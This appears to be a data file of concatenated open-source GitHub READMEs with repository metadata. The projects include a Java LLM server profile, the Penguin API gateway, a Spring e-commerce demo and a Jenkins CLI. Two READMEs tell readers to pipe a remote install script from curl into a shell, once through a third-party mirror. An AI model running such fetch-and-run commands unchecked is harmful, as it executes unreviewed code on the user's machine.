1. **Heavy CPU Usage (`java.util.concurrent.ForkJoinWorkerThread.run`) at 86%**
   - This is likely a thread-pool executor used for parallelizing tasks. It suggests significant multi-threaded execution, possibly parallelized matrix operations or tensor calculations.

2. **`com.llama4j.core.FloatTensor$$Lambda.accept` (61.5%)**
   - This method involves processing a tensor's float data. Lambda expressions in Java are anonymous functions, often used for concise representations of callbacks or functional programming.

3. **`jdk.incubator.vector.FloatVector.reduceLanes` (49.5%)**
   - Indicates vectorized computation involving float vectors. This uses the Vector API from the JDK's incubator module, designed to perform operations on wide vectors leveraging CPU SIMD (Single Instruction, Multiple Data) capabilities.

4. **`com.llama4j.core.ArrayFloatTensor.getFloatVector` (7.7%)**
   - Suggests fetching float vectors from an array-based tensor representation. This could be another bottleneck related to memory access when performing operations.

5. **`com.llama4j.web.rest.LlamaWrapperApplication.chatCompletions` (13.9%)**
   - Indicates that part of the time is spent processing chat completion requests, suggesting this application is likely an LLM interface or chatbot.

6. **`com.llama4j.core.FloatTensor.matmul` (12.0%)**
   - This is the matrix multiplication function, which contributes to the linear algebra operations in the application, likely forming the backbone of the model's computations.

### Potential Bottlenecks and Optimization Ideas

- **ForkJoinWorkerThread**: If this thread is consuming 86% of the CPU, there might be room to optimize the parallelization strategy. Investigate if there‚Äôs overhead or contention between threads.
- **Vectorization**: The use of `jdk.incubator.vector.FloatVector` shows a good attempt at leveraging vectorized operations, but it may need tuning based on the target CPU‚Äôs vector width (e.g., AVX-512 support).
- **Memory Access**: The significant time spent in `ArrayFloatTensor.getFloatVector` could indicate a memory bandwidth bottleneck. This might benefit from optimizing data locality or using more efficient memory layouts (like row-major or column-major order).

---

### Key Findings by Claude

1. **FloatTensor Operations: 61.5% of execution time**

com.llama4j.core.FloatTensor$$Lambda$0x0000000080143b048.accept(int)
Likely the core model inference bottleneck

2. **Vector Operations: 49.5% of execution time**

jdk.incubator.vector.Float128Vector.reduceLanes(VectorOperators$Associative)
Part of the FloatTensor operations

3. **Array Processing: 7.7% of execution time**

com.llama4j.core.ArrayFloatTensor.getFloatVector(VectorSpecies, int)

4. **HTTP Request Handling: 13.9% of execution time**

com.llama4j.web.rest.LlamaWrapperApplication.chatCompletions(ChatCompletionRequest)

#### Recommendations

1. **Optimize Tensor Operations:**

Profile the FloatTensor class to identify specific bottlenecks
Consider using more efficient linear algebra libraries or GPU acceleration
Optimize memory access patterns and data structures

2. **Improve Vector Processing:**

Investigate the use of more efficient vector operations or libraries
Consider using SIMD instructions if not already implemented

3. **Enhance Array Processing:**

Optimize the getFloatVector method in ArrayFloatTensor
Consider using more efficient data structures or access patterns

4. **Optimize HTTP Request Handling:**

Profile the chatCompletions method to identify specific bottlenecks
Consider implementing caching mechanisms or request batching
Optimize data serialization/deserialization if applicable

#### General Optimizations:

- Implement multi-threading for parallel processing where applicable
- Optimize memory usage and garbage collection
- Consider using a more performant JVM or JIT compiler

---

## Credits

This is just a simple Spring Boot OpenAI REST wrapper around the amazing [Llama3.java project](https://github.com/mukel/llama3.java) from Alfonso¬≤ Peterssen! 

Thanks Alfonso for leading the way! üí™üèª ‚òïÔ∏è
",0,0,1,MIT,,0.0
louie-velarde/DevQS,main,"# DevQS

Quick Settings tiles for developers

[<img src=""https://f-droid.org/badge/get-it-on.png""
    alt=""Get it on F-Droid""
    height=""80"">](https://f-droid.org/packages/me.velc.devqs)


Tired of banking and other financial apps whining that Developer Options is on? With *DevQS*,
Developer Options can be toggled off then back on from the Quick Settings panel without resetting
other settings. Long-clicking on any of the tiles will also open the Developer Options settings
screen if the DEV toggle is on.

**IMPORTANT:**

There is no launcher icon nor activity. The tiles must be manually added to the Quick Settings panel.
The app requires the permission WRITE_SECURE_SETTINGS which can be granted using ADB.

`adb shell pm grant me.velc.devqs android.permission.WRITE_SECURE_SETTINGS`

Also, the tiles are disabled while on the lock screen and can only be toggled after unlocking the device.
If that is not the case, try allowing auto-start or turning off battery optimizations for the app.
See [dontkillmyapp.com](https://dontkillmyapp.com) for instructions.

## Screenshots

<img src=""fastlane/metadata/android/en-US/images/phoneScreenshots/1.jpg"" width=49% /> <img src=""fastlane/metadata/android/en-US/images/phoneScreenshots/2.jpg"" width=49% />
",0,1,1,MIT,,1.0
shuru-project/shuru,main,"<div align=""center"">

![Shuru Logo](shuru.svg)

# <span style=""font-family: 'Arial', sans-serif;"">Shuru</span>

A task runner and version manager for Node.js and Python, written in Rust! Shuru simplifies your development workflow by automating tasks and managing language versions.

[![Version](https://img.shields.io/badge/version-0.0.26-blue)](https://github.com/shuru-project/shuru/releases)
[![License](https://img.shields.io/badge/license-MIT-lightgrey)](https://opensource.org/licenses/MIT)
[![CI Status](https://img.shields.io/badge/build-passing-brightgreen)](https://github.com/shuru-project/shuru/actions)
[![Contributors](https://img.shields.io/badge/contributors-5-orange)](https://github.com/shuru-project/shuru/graphs/contributors)
[![Stars](https://img.shields.io/github/stars/shuru-project/shuru?style=social)](https://github.com/shuru-project/shuru/stargazers)
[![Forks](https://img.shields.io/github/forks/shuru-project/shuru?style=social)](https://github.com/shuru-project/shuru/network/members)
[![Open Issues](https://img.shields.io/github/issues/shuru-project/shuru)](https://github.com/shuru-project/shuru/issues)
[![Hacktoberfest](https://img.shields.io/badge/Hacktoberfest-2024-brightgreen)](https://github.com/shuru-project/shuru/discussions/10)


**Join us in [Hacktoberfest](https://github.com/shuru-project/shuru/discussions/10) and contribute to open source!**

</div>

## üìö Table of Contents

- [üåü Introduction](#-introduction)
- [üöÄ Installation](#-installation)
- [üìö Usage](#-usage)
- [üõ†Ô∏è Detailed Examples](#-detailed-examples)
  - [Node.js Project](#nodejs-project)
  - [Python Project](#python-project)
- [ü§ù Community](#-community)
- [üìÑ License](#-license)
- [ü§ó Contributing](#-contributing)

## üåü Introduction

Shuru enhances productivity by offering:

- **üîß Task Automation**: Define and run tasks effortlessly.
- **üåê Version Management**: Built-in Node.js and Python version management.
- **üíª Shell Completions**: Enjoy auto-completion in Bash, Zsh, and Fish.

## üöÄ Installation

### Linux and macOS

To install the `shuru` CLI, run:

```bash
sh -c ""$(curl -fsSL https://raw.githubusercontent.com/shuru-project/shuru/main/install.sh)""
```

## üìö Usage

1. **Create a `shuru.toml` File**: Define tasks and versions in the file at the project root.

   ### Example Configuration

   ```toml
   [versions]
   node = ""v16.14.0""

   [tasks.setup]
   command = ""npm install""

   [tasks.dev]
   command = ""npm run dev""
   ```

2. **Run Tasks**: Execute defined tasks using:

   ```bash
   shuru <COMMAND>
   ```

   Example:

   ```bash
   shuru setup
   ```

## üõ†Ô∏è Detailed Examples

### Node.js Project

1. Set up a new project and create `shuru.toml` as above.
2. Install dependencies:

   ```bash
   shuru setup
   ```

3. Start development:

   ```bash
   shuru dev
   ```

### Python Project

1. Create a `shuru.toml` for your Python project:

   ```toml
   [versions]
   python = ""3.9.5""

   [tasks.install]
   command = ""pip install -r requirements.txt""

   [tasks.run]
   command = ""python main.py""
   ```

2. Install dependencies:

   ```bash
   shuru install
   ```

3. Run your application:

   ```bash
   shuru run
   ```

## ü§ù Community

Join our community for support and discussions:  

[![Discord](https://img.shields.io/badge/Join%20Discord-7289DA?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/EtZn7EdDdS)

## üìÑ License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## ü§ó Contributing

We welcome contributions! Please check our [Contributing Guidelines](CONTRIBUTING.md) for more information on how to get involved.
",26,3,5,MIT,"release.yml,rust.yml",16.0
caibirdme/penguin,master,"# Penguin API Gateway 

## Introduction

In a word: **Penguin is to Pingora what Kong or APISIX is to openresty.**

Penguin is an API gateway built on top of [Pingora](https://github.com/cloudflare/pingora).

Pingora is very similar to openresty, it's a **framework** for building applications. It's **not** an out of box solution that end-user can use. This is where penguin comes in. 

Penguin is high performance, extensible, and easy to use.


Key features include:
- Concise configuration based on YAML
- Flexible routing matching rules
- composable plugins
- **Easy to extend and customize through plugins**

## Quick View

Here's an example of the configuration file:

```yaml
services:
  - name: service1
    listeners:
      - name: listener1
        address: 0.0.0.0:8080
        protocol: http
    routes:
      - name: public_route
        match:
          uri: 
            regexp: ""/public/api/v\\d+.*""
        plugins:
          - name: cms_rate
            config:
              count: 3
          - name: echo
            config:
              body: ""hello, world""
              status_code: 200
              headers:
                x-custom-header: ""123""
                foo-bar: ""baz""
        cluster: public_backend_cluster
      - name: qq
        match:
          uri: 
            exact: ""/param""
        cluster: public_backend_cluster

    clusters:
      - name: public_backend_cluster
        resolver: static
        lb_policy: round_robin
        config:
          endpoints:
            - 127.0.0.1:9933
            - 127.0.0.1:9934
```

## Configuration Explanation

Here's a detailed explanation of the configuration file:

1. pingora supports multiple seperated services, each service has its own listeners and logic. Similarity, our configuration is consists of multiple services.
```yaml
services:
  - name: service_1
    # ...
  - name: service_2
    # ...
```

2. Service Configuration:
```yaml
services:
  - name: service1 # service name, just for user's convenience
    listeners:
      - name: listener1
        address: 0.0.0.0:8443 # address to listen
        protocol: https # protocol to listen
        ssl_config: # tls config if protocol is https
          cert: /path/to/cert
          key: /path/to/key
    plugins: # plugins that will be applied to all routes in this service
      - name: cms_rate # name of the plugin, must match the name in the plugin registry. cms_rate is `count-min-sketch` based rate limiter
        config: # plugin specific configuration
          total: 100 # 100 requests per ${interval}
          interval: 1m
    routes:
      - name: route_1
        match: # match rule is to define how to match incoming requests
          uri: # match by request uri
            regexp: ""/public/api/v\\d+.*"" # {regexp, prefix, exact} are supported
        plugins: # plugins apply for this route only, order matters, first configured plugin will be applied first
          - name: cms_rate # name of the plugin, must match the name of the plugin in the plugin registry. cms_rate is `count-min-sketch` based rate limiter
            config: # plugin specific configuration
              total: 3 # 3 requests per ${interval}
              interval: 5s
        cluster: cluster_aa # backend cluster to forward to, use this name to refer to the cluster
      - name: route_hello
        match: # match rule is to define how to match incoming requests
          uri: # match by request uri
            prefix: ""/hello"" # {regexp, prefix, exact} are supported
        cluster: cluster_bb # backend cluster to forward to, use this name to refer to the cluster
      # other routes
    clusters: # set of backend clusters
      - name: cluster_aa # name of the cluster
        resolver: static # how to resolve ip address of the cluster, currently supported: static, dns (consul, k8s, nacos... are on the roadmap)
        lb_policy: round_robin # load balancing policy, currently supported: round_robin, random
        config: # cluster specific configuration
          endpoints: # for static resolver, just list all backend addresses
            - 127.0.0.1:9933
            - 127.0.0.1:9934
      - name: cluster_bb # name of the cluster
        resolver: dns # use dns resolver
        lb_policy: random # load balancing policy, currently supported: round_robin, random
        config: # cluster specific configuration
          host: foo.svc.bar
          port: 8500
```


## Plugin Development

Penguin's plugin system is designed to be highly extensible and customizable. You can easily add new plugins or modify existing ones to suit your needs.

To develop a new plugin, you need to implement the `Plugin` trait and register it in the plugin registry. Here's a simple example of how to create a custom plugin:

```rust
use std::{collections::HashMap, sync::Arc};
use async_trait::async_trait;
// and more others ...
use crate::{
    core::plugin::{Plugin, PluginCtx},
    plugins::{PluginResult,errors::*},
};

pub const ECHO_PLUGIN_NAME: &str = ""echo"";

#[derive(Clone)]
pub struct EchoPlugin {
    config: Arc<EchoConfig>,
}

#[derive(Debug, Deserialize)]
struct EchoConfig {
    body: Bytes,
    status_code: StatusCode,
    headers: Option<HashMap<String, String>>,
}

// constructor of the plugin
pub fn create_echo_plugin(cfg: Option<YamlValue>) -> PluginResult<Box<dyn PluginBuilder>> {
    // unmarshal config from yaml
    let config: EchoConfig = serde_yaml::from_value(cfg)?;
    // ...

    // create plugin instance
    Ok(Box::new(EchoPlugin { config: Arc::new(config) }))
}

#[async_trait]
impl Plugin for EchoPlugin {
    async fn request_filter(&self, session: &mut Session, _ctx: &mut PluginCtx) -> Result<bool> {
        // your logic here
        // you can store your state in _ctx
        // you can use session to write response directly and return Ok(true) to stop proxying
        // return Ok(false) to continue proxying
        Ok(false)
    }
}
```

Then you need to register the plugin in the plugin registry `src/plugins/mod.rs`:

```rust
static PLUGIN_BUILDER_REGISTRY: Lazy<HashMap<&'static str, PluginInitFn>> = Lazy::new(|| {
    let arr: Vec<(&str, PluginInitFn)> = vec![
        (echo::ECHO_PLUGIN_NAME, Arc::new(echo::create_echo_plugin)),
        (cms_rate::CMS_RATE_PLUGIN_NAME, Arc::new(cms_rate::create_cms_rate_limiter)),
        // (your_plugin_name, Arc::new(your_plugin_create_func),
        // and more others ...
    ];
    arr.into_iter().collect()
});
```

That's it! Your plugin is now registered and can be used in the configuration file. ‚úø‚úø„ÉΩ(¬∞‚ñΩ¬∞)„Éé‚úø

examples:
- [cms_rate](./src/plugins/cms_rate/mod.rs)
- [echo](./src/plugins/echo/mod.rs)

### Plugin trait

Plugin trait is a subset of Pingora's ProxyHttp trait, you can refer to Pingora's [official documentation](https://github.com/cloudflare/pingora/blob/main/docs/user_guide/phase.md) for more information.

```rust
/// Main trait for plugins, defining various filter methods
#[async_trait]
pub trait Plugin: Send + Sync {
    /// Handle the incoming request.
    ///
    /// In this phase, users can parse, validate, rate limit, perform access control and/or
    /// return a response for this request.
    ///
    /// # Arguments
    ///
    /// * `_session` - Mutable reference to the current session
    /// * `_ctx` - Mutable reference to the plugin context
    ///
    /// # Returns
    ///
    /// * `Ok(true)` if a response was sent and the proxy should exit
    /// * `Ok(false)` if the proxy should continue to the next phase
    async fn request_filter(&self, _session: &mut Session, _ctx: &mut PluginCtx) -> Result<bool> {
        Ok(false)
    }

    /// Handle the incoming request body.
    ///
    /// This function will be called every time a piece of request body is received.
    ///
    /// # Arguments
    ///
    /// * `_session` - Mutable reference to the current session
    /// * `_body` - Mutable reference to an optional Bytes containing the body chunk
    /// * `_end_of_stream` - Boolean indicating if this is the last chunk
    /// * `_ctx` - Mutable reference to the plugin context
    async fn request_body_filter(
        &self,
        _session: &mut Session,
        _body: &mut Option<Bytes>,
        _end_of_stream: bool,
        _ctx: &mut PluginCtx,
    ) -> Result<()> {
        Ok(())
    }

    /// Modify the request before it is sent to the upstream
    ///
    /// # Arguments
    ///
    /// * `_session` - Mutable reference to the current session
    /// * `_upstream_request` - Mutable reference to the upstream request header
    /// * `_ctx` - Mutable reference to the plugin context
    async fn upstream_request_filter(
        &self,
        _session: &mut Session,
        _upstream_request: &mut RequestHeader,
        _ctx: &mut PluginCtx,
    ) -> Result<()> {
        Ok(())
    }

    /// Modify the response header before it is sent to the downstream
    ///
    /// # Arguments
    ///
    /// * `_session` - Mutable reference to the current session
    /// * `_upstream_response` - Mutable reference to the upstream response header
    /// * `_ctx` - Mutable reference to the plugin context
    async fn response_filter(
        &self,
        _session: &mut Session,
        _upstream_response: &mut ResponseHeader,
        _ctx: &mut PluginCtx,
    ) -> Result<()> {
        Ok(())
    }

    /// Handle the response body chunks
    ///
    /// # Arguments
    ///
    /// * `_session` - Mutable reference to the current session
    /// * `_body` - Mutable reference to an optional Bytes containing the body chunk
    /// * `_end_of_stream` - Boolean indicating if this is the last chunk
    /// * `_ctx` - Mutable reference to the plugin context
    fn response_body_filter(
        &self,
        _session: &mut Session,
        _body: &mut Option<Bytes>,
        _end_of_stream: bool,
        _ctx: &mut PluginCtx,
    ) -> Result<()> {
        Ok(())
    }
}
```

## Benchmark

Test Penguin
```bash
Running 30s test @ http://penguin:8080/foo/bar
  2 threads and 400 connections
  Thread Stats   Avg      Stdev     Max   +/- Stdev
    Latency    13.00ms   13.87ms  66.50ms   80.90%
    Req/Sec    23.74k     2.16k   27.68k    69.67%
  1416929 requests in 30.04s, 186.48MB read
Requests/sec:  47175.79
Transfer/sec:      6.21MB
```

Test Nginx
```bash
Running 30s test @ http://nginx:80/foo/bar
  2 threads and 400 connections
  Thread Stats   Avg      Stdev     Max   +/- Stdev
    Latency    19.60ms   85.42ms   1.61s    97.40%
    Req/Sec    24.87k     0.94k   26.70k    72.50%
  1484571 requests in 30.04s, 227.94MB read
Requests/sec:  49414.34
Transfer/sec:      7.59MB
```
Penguin is just a little bit slower than Nginx, but it's still very fast and we have a lot of room to improve.

See benchmark directory for more details.

## TODO

- resolver:
  - [ ] polarismesh
  - [ ] consul
  - [ ] k8s
  - [ ] nacos
- lb_policy:
  - [ ] least_conn
- plugin:
  - [ ] cors
  - [ ] fault injection
  - [ ] better rate limiter
- auth system
- better error handling
- nginx like logging
- self monitoring


## Contributing

We welcome contributions to Penguin! If you have any ideas, suggestions, or bug reports, please feel free to open an issue or submit a pull request.
",0,2,1,,,0.0
ProyectosCoPersonales/Scalable-E-Commerce,main,"# SCALABLE-E-COMMERCE IN SPRING

This project was proposed by Roadmap.sh: https://roadmap.sh/projects/scalable-ecommerce-platform


This backend was developed using **Spring Framework**, with **JWT** and **Spring Security** for security. **PayPal** was integrated for payments, **Twilio** for SMS, and **Java Mail Sender** for emails. Thymeleaf was used to visualize the payment process.
### DEPLOYMENT
```
docker compose up --build
```

![image](https://github.com/user-attachments/assets/f59c1641-9592-4506-9883-38a7fedf9c2d)

### To proceed with the deployment, we need three items: PayPal credentials, Twilio credentials, and Gmail credentials.

<img src=""https://github.com/user-attachments/assets/e5ef64d6-4227-4021-b4d0-9af348f2fa76"" alt=""Descripci√≥n de la imagen"" style=""width: 500px; height: auto;"">


<img src=""https://github.com/user-attachments/assets/a2a0fbb8-8603-4b7a-a158-04dd9695dfc9"" alt=""Descripci√≥n de la imagen"" style=""width: 500px; height: auto;"">

### Microservices Architecture


<img src=""https://github.com/user-attachments/assets/8d5e3021-29f5-400a-bfb8-a15f636ffc19"" alt=""Descripci√≥n de la imagen"" style=""width: 600px; height: auto;"">

## TEST

### REGISTER CUSTOMER AND ADMIN 

<img src=""https://github.com/user-attachments/assets/1f077f92-1042-41d3-941b-1742a70f6746"" alt=""Descripci√≥n de la imagen"" style=""width: 700px; height: auto;"">

<img src=""https://github.com/user-attachments/assets/1f077f92-1042-41d3-941b-1742a70f6746"" alt=""Descripci√≥n de la imagen"" style=""width: 700px; height: auto;"">


### LOGIN (IT IS VERIFIED IF YOU ARE A USER OR ADMIN THROUGH THE TOKEN)

<img src=""https://github.com/user-attachments/assets/afe7c915-4d19-41f6-bff7-58adaf3312a3"" alt=""Descripci√≥n de la imagen"" style=""width: 700px; height: auto;"">

### ADMIN: ADD PRODUCTS TO THE DATABASE


<img src=""https://github.com/user-attachments/assets/9aa81dee-383d-4f9c-a0bf-3d8631b71ddf"" alt=""Descripci√≥n de la imagen"" style=""width: 700px; height: auto;"">

### CLIENT: BUYING
### START OF PURCHASE

<img src=""https://github.com/user-attachments/assets/1f20b1bb-9dd8-44d1-b1ae-b35bf867714b"" alt=""Descripci√≥n de la imagen"" style=""width: 700px; height: auto;"">

### END OF PURCHASE PLEASE NOTE THAT IF THE STOCK IS EXCEEDED, YOUR REQUEST WILL BE REJECTED
### CAN ALSO BE REMOVED

<img src=""https://github.com/user-attachments/assets/c774754a-7d4c-46b1-accf-c89eecad47bc"" alt=""Descripci√≥n de la imagen"" style=""width: 700px; height: auto;"">

```json
{
    ""id"": 1,
    ""idUser"": 1,
    ""email"": ""jandresllg2001@gmail.com"",
    ""total"": 409.44,
    ""cartItems"": [
        {
            ""id"": 1,
            ""idProduct"": 5,
            ""nameProduct"": ""L√°piz Mec√°nico"",
            ""quantity"": 21,
            ""unitPrice"": 2.5
        },
        {
            ""id"": 2,
            ""idProduct"": 2,
            ""nameProduct"": ""Cuaderno A5"",
            ""quantity"": 1,
            ""unitPrice"": 3.0
        },
        {
            ""id"": 3,
            ""idProduct"": 4,
            ""nameProduct"": ""Taza de Cer√°mica"",
            ""quantity"": 2,
            ""unitPrice"": 7.99
        },
        {
            ""id"": 4,
            ""idProduct"": 6,
            ""nameProduct"": ""Regla de Pl√°stico"",
            ""quantity"": 10,
            ""unitPrice"": 1.0
        },
        {
            ""id"": 5,
            ""idProduct"": 7,
            ""nameProduct"": ""Set de Rotuladores"",
            ""quantity"": 2,
            ""unitPrice"": 8.99
        },
        {
            ""id"": 6,
            ""idProduct"": 8,
            ""nameProduct"": ""Cargador USB"",
            ""quantity"": 2,
            ""unitPrice"": 10.0
        },
        {
            ""id"": 7,
            ""idProduct"": 10,
            ""nameProduct"": ""Almohadilla T√©rmica"",
            ""quantity"": 12,
            ""unitPrice"": 20.0
        },
        {
            ""id"": 8,
            ""idProduct"": 15,
            ""nameProduct"": ""Juego de Cuchillos de Cocina"",
            ""quantity"": 2,
            ""unitPrice"": 24.99
        }
    ]
}
```
### CUSTOMER: IT SHOULD BE GENERATED AUTOMATICALLY BUT HERE I DO IT MANUALLY OK

<img src=""https://github.com/user-attachments/assets/0b14ccdb-7e72-4393-b5a8-cd01b2b7f272"" alt=""Descripci√≥n de la imagen"" style=""width: 700px; height: auto;"">

```json
{
    ""orderId"": 1,
    ""name"": ""Juan Andr√©s"",
    ""lastName"": ""L√≥pez Garc√≠a"",
    ""email"": ""jandresllg2001@gmail.com"",
    ""role"": ""CLIENT"",
    ""address"": ""Av. 12345, Edificio XYZ, Apt. 101"",
    ""phone"": ""+241432534"",
    ""items"": [
        {
            ""id"": 1,
            ""idProduct"": 5,
            ""nameProduct"": ""L√°piz Mec√°nico"",
            ""quantity"": 21,
            ""unitPrice"": 2.5,
            ""totalPrice"": 52.5
        },
        {
            ""id"": 2,
            ""idProduct"": 2,
            ""nameProduct"": ""Cuaderno A5"",
            ""quantity"": 1,
            ""unitPrice"": 3.0,
            ""totalPrice"": 3.0
        },
        {
            ""id"": 3,
            ""idProduct"": 4,
            ""nameProduct"": ""Taza de Cer√°mica"",
            ""quantity"": 2,
            ""unitPrice"": 7.99,
            ""totalPrice"": 15.98
        },
        {
            ""id"": 4,
            ""idProduct"": 6,
            ""nameProduct"": ""Regla de Pl√°stico"",
            ""quantity"": 10,
            ""unitPrice"": 1.0,
            ""totalPrice"": 10.0
        },
        {
            ""id"": 5,
            ""idProduct"": 7,
            ""nameProduct"": ""Set de Rotuladores"",
            ""quantity"": 2,
            ""unitPrice"": 8.99,
            ""totalPrice"": 17.98
        },
        {
            ""id"": 6,
            ""idProduct"": 8,
            ""nameProduct"": ""Cargador USB"",
            ""quantity"": 2,
            ""unitPrice"": 10.0,
            ""totalPrice"": 20.0
        },
        {
            ""id"": 7,
            ""idProduct"": 10,
            ""nameProduct"": ""Almohadilla T√©rmica"",
            ""quantity"": 12,
            ""unitPrice"": 20.0,
            ""totalPrice"": 240.0
        },
        {
            ""id"": 8,
            ""idProduct"": 15,
            ""nameProduct"": ""Juego de Cuchillos de Cocina"",
            ""quantity"": 2,
            ""unitPrice"": 24.99,
            ""totalPrice"": 49.98
        }
    ],
    ""totalAmount"": 409.44,
    ""orderStatus"": ""PENDING"",
    ""orderDate"": ""2024-09-24T00:38:03.912451144""
}
```
### THE PAYMENT PROCESS IS THE ONLY ONE WITH INTERFACE
<img src=""https://github.com/user-attachments/assets/49000bac-3bed-4196-af07-55bb09dcb0d9"" alt=""Descripci√≥n de la imagen"" style=""width: 700px; height: auto;"">

### PAYING

<img src=""https://github.com/user-attachments/assets/6ee6a615-dd61-47aa-a9e8-135a6f48640e"" alt=""Descripci√≥n de la imagen"" style=""width: 700px; height: auto;"">
<img src=""https://github.com/user-attachments/assets/d98a0d3a-c883-42ed-a1a9-bc186e1be463"" alt=""Descripci√≥n de la imagen"" style=""width: 700px; height: auto;"">

### RECEIVING SUCCESSFUL PAYMENT EMAIL

<img src=""https://github.com/user-attachments/assets/79336c6b-9eff-449b-9e3c-7a2014980f8f"" alt=""Descripci√≥n de la imagen"" style=""width: 700px; height: auto;"">

### THE ADMINISTRATOR'S FUNCTIONS WOULD BE TO BE ABLE TO SEE THE ORDER HISTORY OF ALL USERS AND THINGS LIKE THAT
### IF I DO IT AS A CUSTOMER IT DOES NOT ALLOW

<img src=""https://github.com/user-attachments/assets/026452ef-11aa-43e4-8427-0dfd6695815f"" alt=""Descripci√≥n de la imagen"" style=""width: 700px; height: auto;"">
",0,0,1,,,0.0
Eyob94/shush-rs,master,"# shush-rs

[![crates.io](https://img.shields.io/crates/v/shush-rs.svg)](https://crates.io/crates/shush-rs)
[![Github](https://img.shields.io/badge/github-eyob94/shush-rs)](https://github.com/Eyob94/shush-rs)

A Rust crate designed to manage sensitive data securely by leveraging memory protection mechanisms. It extends the functionality of the [secrecy](https://crates.io/crates/secrecy) crate to provide enhanced security features using memory locking and protection techniques. Specifically, `shush-rs` ensures that secrets are kept safe from unauthorized access and are properly zeroized when no longer needed.

### Brief overview

- `mlock`: this is a system call that locks a specified range of memory into RAM, preventing it from being swapped out to disk.
- `mprotect`: is a system call that changes the access protections (read, write, execute) for a specified range of memory.

### Features

- Memory Locking: Uses mlock to lock the secret's memory page, preventing it from being swapped to disk.
- Memory Protection: Employs mprotect to initially set the memory page to non-readable/writable and then to readable/writable only when needed.
- Zeroization: Guarantees that secrets are securely zeroized before they are dropped, minimizing the risk of sensitive data lingering in memory.

### Key Components

- `SecretBox`: A secure container for sensitive data. It locks the memory of the contained secret and ensures it is zeroized on drop.
- `CloneableSecret`: A trait for secrets that can be cloned, while ensuring the original is zeroized after cloning.
- `ExposeSecret` and `ExposeSecretMut`: Traits that provide controlled access to secrets, allowing read-only or mutable access while maintaining security.

### Usage

```rust
fn protect_secret(){

  let secret = Box::new(String::from(""Encrypted""));

  let mut secret_box = SecretBox::new(secret); // Secret's memory page is mlocked

  println!(""Secret: {:?}"", secret_box); // Prints ""Secret: SecretBox<alloc::string::String>([REDACTED])""

  let exposed_secret = secret_box.expose_secret();

  println!(""Exposed Secret:{:?}"", exposed_secret); // Prints ""ExposedSecret: SecretGuardMut { data: ""Encrypted"" }""
} // Memory page is munlocked when it's dropped

```
",1,2,2,,ci.yaml,17.0
mmatczuk/bioniconv,main,"# Bioniconv

Bioniconv is a single pass bionic reading converter for epub files.
It is written in Rust for single threaded performance. 

Example usage:

```sh
$ cargo build --release
$ ./target/release/bioniconv path/to/file.epub
```

It produces new file in a current working directory with the same name as the input file but with `bionic_` prefix.

The image below shows before and after conversion of a page from a book.

![example.png](docs/example.png)

## Performance

On my machine the King James Bible epub file, 1.7MiB of compressed text, was converted in less than a second.

```sh
$ time ./target/release/bioniconv ~/Downloads/pg10900.epub

real    0m0.937s
user    0m0.589s
sys     0m0.041s
```
",0,0,1,,rust.yml,0.0
kairyou/jenkins-cli,main,"# jenkins-cli

A powerful and efficient Jenkins CLI tool written in Rust. Simplifies deployment of Jenkins projects through command line.

[‰∏≠ÊñáÊñáÊ°£](README_zh.md)

## Features

- Fast and efficient Jenkins job deployment
- Intuitive command-line interface with real-time console output
- Support for multiple Jenkins services, project filtering
- Common Jenkins operations support (e.g., triggering builds)
- High performance and cross-platform compatibility (Mac, Windows, Linux)
- Remembers last build parameters for quick re-runs

### Demo

![Demo](./assets/demo.gif)

## Installation

To install the Jenkins CLI tool, use one of the following methods:

```bash
bash <(curl -fsSL https://raw.githubusercontent.com/kairyou/jenkins-cli/main/scripts/install.sh)
```

Or use ghp.ci mirror (if GitHub is inaccessible)

```bash
bash <(curl -fsSL https://ghp.ci/raw.githubusercontent.com/kairyou/jenkins-cli/main/scripts/install.sh)
```

If you have Rust and Cargo installed, you can install Jenkins CLI directly from crates.io:

```bash
cargo install jenkins
```

Alternatively, you can download the binary file from the [Releases page](https://github.com/kairyou/jenkins-cli/releases).

## Usage

After setting up the configuration file (see [Configuration](#configuration) section), you can simply run:

```bash
jenkins
```

This command will:

1. Prompt you to select a Jenkins service (if multiple are configured)
2. Display a list of available projects
3. Select a project and set build parameters
4. Trigger the build and show real-time console output

You can also use command line arguments:

```bash
# Run with Jenkins project URL - Deploy project directly without selection
jenkins -U http://jenkins.example.com:8081/job/My-Job/ -u username -t api_token

# Run with Jenkins server URL - Show project list for selection and deploy
jenkins -U http://jenkins.example.com:8081 -u username -t api_token
```

Available command line options:
- `-U, --url <URL>`: Jenkins server URL or project URL
- `-u, --user <USER>`: Jenkins username
- `-t, --token <TOKEN>`: Jenkins API token

## Configuration

Create a file named `.jenkins.toml` in your home directory with the following content:

```toml
# $HOME/.jenkins.toml
[config]
# locale = ""en-US"" # (optional), default auto detect, e.g. zh-CN, en-US
# enable_history = false # (optional), default true
# check_update = false # (optional), default true

[[jenkins]]
name = ""SIT""
url = ""https://jenkins-sit.your-company.com""
user = ""your-username""
token = ""your-api-token""
# includes = []
# excludes = []

# [[jenkins]]
# name = ""PROD""
# url = ""https://jenkins-prod.your-company.com""
# user = ""your-username""
# token = ""your-api-token""
# includes = [""frontend"", ""backend""]
# excludes = [""test""]
```

### Configuration Options

- `config`: Global configuration section
  - `locale`: Set language (optional), default auto detect, e.g. ""zh-CN"", ""en-US""
  - `enable_history`: Remember last build parameters (optional), default true, set to false to disable
  - `check_update`: Automatically check for updates (optional), default true, set to false to disable
- `jenkins`: Service configuration section (supports multiple services)
  - `name`: Service name (e.g., ""SIT"", ""UAT"", ""PROD"")
  - `url`: Jenkins server URL
  - `user`: Your Jenkins user ID
  - `token`: Your Jenkins API token
  - `includes`: List of strings or regex patterns to include projects (optional)
  - `excludes`: List of strings or regex patterns to exclude projects (optional)
  - `enable_history`: Remember build parameters (optional), overrides global setting if specified

### Project Filtering

You can use `includes` or `excludes` to filter projects:

- `includes: [""frontend"", ""backend"", ""^api-""]` # Include projects containing [frontend, backend, api-]
- `excludes: [""test"", ""dev"", "".*-deprecated$""]` # Exclude projects containing [test, dev, *-deprecated]

Note: Regex patterns are case-sensitive unless specified otherwise (e.g., `(?i)` for case-insensitive matching).

### Username and API Token

Your Jenkins username is typically the same as your login username for the Jenkins web interface.

To generate an API token:

1. Log in to your Jenkins server
2. Click on your name in the top right corner
3. Click on `Configure` in the left sidebar
4. In the `API Token` section, click `Add new Token`
5. Give your token a name and click ""Generate""
6. Copy the generated token and paste it into your `.jenkins.toml` file

Note: Keep your API token secure. Do not share it or commit it to version control.

## TODOs

- [x] Support multiple Jenkins services
- [x] Support string and text parameter types
- [x] Support choice parameter type
